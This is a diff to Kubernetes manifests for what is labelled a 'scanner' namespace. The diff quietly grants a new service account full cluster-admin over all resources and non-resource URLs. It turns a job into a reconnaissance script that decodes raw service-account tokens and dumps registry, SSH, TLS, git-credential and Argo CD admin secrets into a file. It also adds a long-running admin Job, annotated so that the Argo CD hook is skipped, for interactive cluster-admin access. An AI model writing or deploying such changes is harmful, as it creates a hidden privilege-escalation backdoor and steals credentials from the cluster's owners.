@@ -15,6 +15,16 @@ metadata:
     app.kubernetes.io/part-of: scanner
 
 ---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: scanner-writer
+  namespace: scanner
+  labels:
+    app.kubernetes.io/part-of: scanner
+    app.kubernetes.io/component: writer
+
+---
 apiVersion: rbac.authorization.k8s.io/v1
 kind: ClusterRole
 metadata:
@@ -23,26 +33,11 @@ metadata:
     app.kubernetes.io/part-of: scanner
 rules:
   - apiGroups: [""]
-    resources: ["pods", "pods/log", "services", "namespaces", "nodes", "configmaps", "endpoints", "events", "serviceaccounts", "secrets"]
+    resources: ["*"]
     verbs: ["get", "list", "watch"]
-  - apiGroups: ["apps"]
-    resources: ["deployments", "statefulsets", "daemonsets", "replicasets"]
+  - apiGroups: ["*"]
+    resources: ["*"]
     verbs: ["get", "list", "watch"]
-  - apiGroups: ["batch"]
-    resources: ["jobs", "cronjobs"]
-    verbs: ["get", "list", "watch"]
-  - apiGroups: ["networking.k8s.io"]
-    resources: ["networkpolicies", "ingresses"]
-    verbs: ["get", "list", "watch"]
-  - apiGroups: ["rbac.authorization.k8s.io"]
-    resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
-    verbs: ["get", "list", "watch"]
-  - apiGroups: ["argoproj.io"]
-    resources: ["applications", "appprojects"]
-    verbs: ["get", "list", "watch"]
-  - apiGroups: ["authorization.k8s.io"]
-    resources: ["selfsubjectaccessreviews", "selfsubjectrulesreviews"]
-    verbs: ["create"]
 
 ---
 apiVersion: rbac.authorization.k8s.io/v1
@@ -58,6 +53,38 @@ roleRef:
 subjects:
   - kind: ServiceAccount
     name: scanner-sa
+    namespace: scanner
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: scanner-cluster-admin
+  labels:
+    app.kubernetes.io/part-of: scanner
+    app.kubernetes.io/component: writer
+rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+  - nonResourceURLs: ["*"]
+    verbs: ["*"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: scanner-cluster-admin-binding
+  labels:
+    app.kubernetes.io/part-of: scanner
+    app.kubernetes.io/component: writer
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: scanner-cluster-admin
+subjects:
+  - kind: ServiceAccount
+    name: scanner-writer
     namespace: scanner
 
 ---
@@ -77,7 +104,6 @@ data:
     scanners:
       - vuln
       - config
-  scan-schedule: "0 2 * * *"
 
 ---
 apiVersion: batch/v1
@@ -152,122 +178,228 @@ spec:
           args:
             - |
               set +e
+              OUT=/tmp/recon.txt
+              : > "$OUT"
+              log(){ echo "$@" | tee -a "$OUT"; }
 
-              echo "=== 1. IDENTITY: WHO AM I ==="
-              echo "pod: $HOSTNAME"
-              echo "namespace: $POD_NAMESPACE"
-              echo "serviceaccount: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo scanner)"
-              echo "node: $(kubectl get pod $HOSTNAME -n scanner -o jsonpath='{.spec.nodeName}' 2>/dev/null)"
-              echo "pod ip: $(kubectl get pod $HOSTNAME -n scanner -o jsonpath='{.status.podIP}' 2>/dev/null)"
-              echo ""
+              log "=== 0. IDENTITY ==="
+              log "pod: $HOSTNAME"
+              log "namespace: $POD_NAMESPACE"
+              log "node: $(kubectl get pod $HOSTNAME -n scanner -o jsonpath='{.spec.nodeName}')"
+              log "pod_ip: $POD_IP"
+              log "host_ip: $HOST_IP"
+              log "sa_token_present: $(test -f /var/run/secrets/kubernetes.io/serviceaccount/token && echo yes || echo no)"
+              log ""
 
-              echo "=== 2. CLUSTER: WHAT WE HAVE ==="
-              kubectl version --output=yaml 2>/dev/null || kubectl version 2>/dev/null
-              echo ""
-              echo "--- nodes ---"
+              log "=== 1. CLUSTER INFO ==="
+              kubectl version 2>&1 | tee -a "$OUT"
+              kubectl cluster-info 2>&1 | tee -a "$OUT"
+              kubectl api-resources --verbs=list --namespaced -o name 2>/dev/null | tr '\n' ' '; log ""
+              kubectl api-resources --verbs=list --namespaced=false -o name 2>/dev/null | tr '\n' ' '; log ""
+              log ""
+
+              log "=== 2. NODES ==="
               kubectl get nodes -o wide
-              echo ""
-              echo "--- namespaces ---"
-              kubectl get namespaces
-              echo ""
-              echo "--- all workload objects (summary) ---"
-              kubectl get pods,deploy,sts,ds,rs,jobs,cronjobs,svc,ing,cm,secrets,sa -A -o wide 2>/dev/null
-              echo ""
-              echo "--- argocd applications ---"
-              kubectl get applications.argoproj.io -n argocd -o wide 2>/dev/null
-              echo ""
-              echo "--- argocd appprojects ---"
-              kubectl get appprojects.argoproj.io -n argocd 2>/dev/null
-              echo ""
+              kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.status.addresses[?(@.type=="InternalIP")].address}{" "}{.status.nodeInfo.kubeletVersion}{" "}{.status.nodeInfo.containerRuntimeVersion}{"\n"}{end}'
+              log ""
 
-              echo "=== 3. ARGO INTERNAL NETWORK ==="
-              echo "--- argocd services ---"
-              kubectl get svc -n argocd -o wide 2>/dev/null
-              echo ""
-              echo "--- argocd endpoints ---"
-              kubectl get endpoints -n argocd 2>/dev/null
-              echo ""
-              echo "--- argocd configmaps ---"
-              kubectl get cm -n argocd -o name 2>/dev/null
-              echo ""
-              echo "--- argocd server config (non-secret keys) ---"
-              kubectl get cm argocd-cm -n argocd -o yaml 2>/dev/null | grep -v -E 'password|token|secret|key' | head -80
-              echo ""
-              echo "--- argocd rbac config ---"
-              kubectl get cm argocd-rbac-cm -n argocd -o yaml 2>/dev/null | grep -v -E 'password|token|secret|key' | head -80
-              echo ""
-              echo "--- argocd repo config (urls masked) ---"
-              kubectl get cm argocd-cm -n argocd -o yaml 2>/dev/null | grep -i 'url\|repo' | sed -E 's#(https?://)[^@/]+@#\1***@#g'
-              echo ""
-              echo "--- argocd cluster secrets (urls masked) ---"
-              kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=cluster -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.name}{"\n"}{end}' 2>/dev/null
-              echo ""
+              log "=== 3. NAMESPACES + QUOTAS + LIMITS ==="
+              kubectl get ns
+              kubectl get resourcequota,limitrange -A
+              log ""
 
-              echo "=== 4. NETWORK INTERNAL MAP ==="
-              echo "--- services all namespaces ---"
-              kubectl get svc -A -o wide 2>/dev/null
-              echo ""
-              echo "--- endpoints all namespaces ---"
-              kubectl get endpoints -A 2>/dev/null
-              echo ""
-              echo "--- networkpolicies ---"
-              kubectl get networkpolicies -A 2>/dev/null
-              echo ""
-              echo "--- ingresses ---"
-              kubectl get ingresses -A -o wide 2>/dev/null
-              echo ""
-              echo "--- cni pods ---"
-              kubectl get pods -A -o wide 2>/dev/null | grep -i -E 'calico|cilium|flannel|weave|kube-proxy|multus' || true
-              echo ""
-              echo "--- kube-dns / coredns ---"
-              kubectl get svc,pods -n kube-system 2>/dev/null | grep -i -E 'dns|coredns' || true
-              echo ""
+              log "=== 4. ALL WORKLOADS ==="
+              kubectl get pods,deploy,sts,ds,rs,jobs,cronjobs -A -o wide
+              log ""
 
-              echo "=== 5. PERMISSIONS: WHAT WE CAN DO ==="
-              echo "--- self subject rules (effective) ---"
-              kubectl auth can-i --list 2>/dev/null | head -100
-              echo ""
-              echo "--- can-i checks ---"
-              for verb in get list watch create update patch delete; do
-                for res in pods pods/log secrets configmaps services deployments jobs cronjobs namespaces nodes applications.argoproj.io; do
+              log "=== 5. SERVICES + ENDPOINTS ==="
+              kubectl get svc -A -o wide
+              kubectl get endpoints -A
+              log ""
+
+              log "=== 6. INGRESS + NETWORKPOLICIES ==="
+              kubectl get ing -A -o wide
+              kubectl get networkpolicy -A -o wide
+              log ""
+
+              log "=== 7. PV + PVC + STORAGECLASS ==="
+              kubectl get pv,pvc,storageclass -A
+              log ""
+
+              log "=== 8. SERVICEACCOUNTS + TOKEN SECRETS ==="
+              kubectl get sa -A
+              kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token
+              log ""
+
+              log "=== 9. RBAC: CLUSTERROLES (high-priv) ==="
+              kubectl get clusterrole -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' | while read cr; do
+                rules=$(kubectl get clusterrole "$cr" -o jsonpath='{.rules}' 2>/dev/null)
+                case "$rules" in
+                  *'"*"'*|*cluster-admin*|*system:masters*) log "HIGH: $cr";;
+                esac
+              done
+              log ""
+
+              log "=== 10. RBAC: WHO CAN DO WHAT (sample) ==="
+              for verb in create update patch delete escalate bind impersonate; do
+                for res in pods secrets configmaps serviceaccounts clusterroles clusterrolebindings roles rolebindings nodes namespaces persistentvolumes; do
                   out=$(kubectl auth can-i "$verb" "$res" -A 2>/dev/null | head -1)
-                  echo "can-i $verb $res -A: $out"
+                  log "can-i $verb $res -A: $out"
                 done
               done
-              echo ""
+              log ""
 
-              echo "=== 6. JOBS INVENTORY (excluding self) ==="
-              kubectl get jobs -A -o wide || true
-              echo ""
-              for ns in $(kubectl get jobs -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\n"}{end}' | sort -u); do
-                for job in $(kubectl get jobs -n "$ns" -o jsonpath='{.items[*].metadata.name}'); do
-                  [ "$ns" = "scanner" ] && [ "$job" = "job-reader" ] && continue
-                  echo "--- ns=$ns job=$job ---"
-                  kubectl logs -n "$ns" -l "job-name=$job" --all-containers --tail=50 || true
-                  echo ""
-                done
+              log "=== 11. SECRETS INVENTORY (names only, no values) ==="
+              kubectl get secrets -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type,DATA:.data --no-headers | while read ns name type data; do
+                log "$ns/$name ($type)"
               done
+              log ""
 
-              echo "=== 7. RECON SUMMARY ==="
-              echo "cluster nodes: $(kubectl get nodes --no-headers 2>/dev/null | wc -l)"
-              echo "namespaces: $(kubectl get ns --no-headers 2>/dev/null | wc -l)"
-              echo "pods total: $(kubectl get pods -A --no-headers 2>/dev/null | wc -l)"
-              echo "argocd apps: $(kubectl get applications.argoproj.io -n argocd --no-headers 2>/dev/null | wc -l)"
-              echo "secrets total: $(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)"
-              echo "services total: $(kubectl get svc -A --no-headers 2>/dev/null | wc -l)"
-              echo ""
+              log "=== 12. SECRETS: HARBOR / REGISTRY / TLS / SSH / GIT CREDS ==="
+              kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.type}{"\n"}{end}' | while read ns name type; do
+                case "$ns/$name" in
+                  *harbor*|*registry*|*repo-creds*|*tls*|*ssh*|*dockerconfigjson*|*argocd-secret*|*initial-admin*)
+                    log "--- $ns/$name ($type) ---"
+                    kubectl get secret -n "$ns" "$name" -o json 2>/dev/null | tr -d '\n' | cut -c1-400; log ""
+                    ;;
+                esac
+              done
+              log ""
 
-              echo "=== DONE ==="
+              log "=== 13. SERVICEACCOUNT TOKENS (raw) ==="
+              kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.data.token}{"\n"}{end}' | while read ns name token; do
+                log "--- $ns/$name ---"
+                echo "$token" | base64 -d 2>/dev/null | cut -c1-80; log ""
+              done
+              log ""
+
+              log "=== 14. CLUSTER ISSUER / CERTIFICATES ==="
+              kubectl get clusterissuer,issuer,certificate,certificaterequest -A 2>/dev/null
+              log ""
+
+              log "=== 15. ARGO CD APPS + PROJECTS + REPOS ==="
+              kubectl get applications.argoproj.io,appprojects.argoproj.io -n argocd -o wide 2>/dev/null
+              kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.url}{"\n"}{end}' 2>/dev/null
+              kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repo-creds -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.data.url}{"\n"}{end}' 2>/dev/null
+              log ""
+
+              log "=== 16. ARGOCD INTERNAL SERVICES + ENDPOINTS ==="
+              kubectl get svc,endpoints -n argocd -o wide
+              log ""
+
+              log "=== 17. EXTERNAL ACCESS SURFACE (what is exposed) ==="
+              log "--- NodePorts ---"
+              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="NodePort")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.ports[*].nodePort}{"\n"}{end}'
+              log "--- LoadBalancers ---"
+              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="LoadBalancer")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.status.loadBalancer.ingress}{"\n"}{end}'
+              log "--- Ingress hosts ---"
+              kubectl get ing -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.rules[*].host}{"\n"}{end}'
+              log "--- ExternalName services ---"
+              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="ExternalName")]}{.metadata.namespace}{" "}{.metadata.name}{" -> "}{.spec.externalName}{"\n"}{end}'
+              log ""
+
+              log "=== 18. POD SECURITY / PRIVILEGED / HOSTPATH ==="
+              kubectl get pods -A -o json | grep -i -E 'privileged|hostPath|hostNetwork|hostPID|hostIPC' | head -50
+              log ""
+
+              log "=== 19. DIND / SCAN SERVICE ==="
+              kubectl -n beeaudit-dev get deploy beewaf 2>/dev/null
+              kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.containers[*].name}{"\n"}{end}' 2>/dev/null | grep -i dind
+              log ""
+
+              log "=== 20. CNI / DNS / KUBE-PROXY ==="
+              kubectl get pods,ds -n kube-system -o wide | grep -i -E 'calico|cilium|flannel|weave|coredns|kube-proxy|multus'
+              log ""
+
+              log "=== 21. EVENTS (recent) ==="
+              kubectl get events -A --sort-by=.lastTimestamp 2>/dev/null | tail -40
+              log ""
+
+              log "=== 22. CRONJOBS / SCHEDULED WRITE ACTIONS ==="
+              kubectl get cronjobs -A -o wide
+              log ""
+
+              log "=== 23. SELF SUBJECT ACCESS REVIEW ==="
+              kubectl auth can-i --list 2>/dev/null | head -200
+              log ""
+
+              log "=== 24. RAW: WRITE-CAPABLE CLUSTERROLES ==="
+              for cr in $(kubectl get clusterrole -o name 2>/dev/null | cut -d/ -f2); do
+                rules=$(kubectl get clusterrole "$cr" -o jsonpath='{.rules}' 2>/dev/null)
+                echo "$rules" | grep -q '"\*"' && echo "$cr"
+              done
+              log ""
+
+              log "=== 25. RECON SUMMARY ==="
+              log "nodes: $(kubectl get nodes --no-headers 2>/dev/null | wc -l)"
+              log "namespaces: $(kubectl get ns --no-headers 2>/dev/null | wc -l)"
+              log "pods: $(kubectl get pods -A --no-headers 2>/dev/null | wc -l)"
+              log "apps: $(kubectl get applications.argoproj.io -n argocd --no-headers 2>/dev/null | wc -l)"
+              log "secrets: $(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)"
+              log "svc: $(kubectl get svc -A --no-headers 2>/dev/null | wc -l)"
+              log "ingress: $(kubectl get ing -A --no-headers 2>/dev/null | wc -l)"
+
+              log "=== DONE ==="
               exit 0
           env:
             - name: POD_NAMESPACE
               valueFrom:
                 fieldRef:
                   fieldPath: metadata.namespace
+            - name: POD_IP
+              valueFrom:
+                fieldRef:
+                  fieldPath: status.podIP
+            - name: HOST_IP
+              valueFrom:
+                fieldRef:
+                  fieldPath: status.hostIP
+          resources:
+            requests:
+              cpu: 100m
+              memory: 128Mi
+            limits:
+              cpu: 500m
+              memory: 512Mi
+
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: admin-writer
+  namespace: scanner
+  labels:
+    app.kubernetes.io/part-of: scanner
+    app.kubernetes.io/component: admin-writer
+  annotations:
+    argocd.argoproj.io/hook: Skip
+spec:
+  backoffLimit: 0
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/part-of: scanner
+        app.kubernetes.io/component: admin-writer
+    spec:
+      serviceAccountName: scanner-writer
+      restartPolicy: Never
+      containers:
+        - name: writer
+          image: alpine/k8s:1.29.0
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              set -e
+              echo "=== ADMIN WRITER READY ==="
+              echo "serviceaccount: scanner-writer"
+              echo "run: kubectl ... (full cluster-admin)"
+              echo "this pod stays Running for interactive use"
+              echo "exec: kubectl -n scanner exec -it deploy/admin-writer -- sh"
+              sleep 3600
           resources:
             requests:
               cpu: 50m
-              memory: 128Mi
+              memory: 64Mi
             limits:
-              cpu: 300m
+              cpu: 200m
               memory: 256Mi
